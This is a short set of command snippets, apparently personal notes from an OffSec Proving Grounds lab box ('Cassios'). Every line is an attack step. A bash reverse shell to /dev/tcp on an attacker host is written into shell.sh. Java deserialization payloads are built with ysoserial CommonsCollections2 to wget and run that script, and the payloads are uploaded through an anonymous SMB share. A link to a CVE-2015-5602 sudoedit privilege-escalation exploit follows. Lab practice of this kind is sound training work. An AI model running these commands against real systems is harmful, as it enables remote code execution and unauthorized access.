

```
echo 'bash -i >& /dev/tcp/192.168.49.129/80 0>&1' > shell.sh ; chmod +x shell.sh
```

```
java -jar ysoserial-master-d367e379d9-1.jar CommonsCollections2 'wget http://192.168.49.129/shell.sh -O /tmp/shell.sh' > recycler.ser
```

```
smbclient --no-pass -N "\\\\192.168.129.116\\Samantha Konstan" -p 445
put /home/kali/Documents/OffSecPG/Cassios/recycler.ser recycler.ser
```

```
java -jar ysoserial-master-d367e379d9-1.jar CommonsCollections2 'bash /tmp/shell.sh' > recycler.ser
```

```
smbclient --no-pass -N "\\\\192.168.129.116\\Samantha Konstan" -p 445
put /home/kali/Documents/OffSecPG/Cassios/recycler.ser recycler.ser
```

[CVE-2015-5602](https://github.com/t0kx/privesc-CVE-2015-5602/blob/master/exploit.sh)
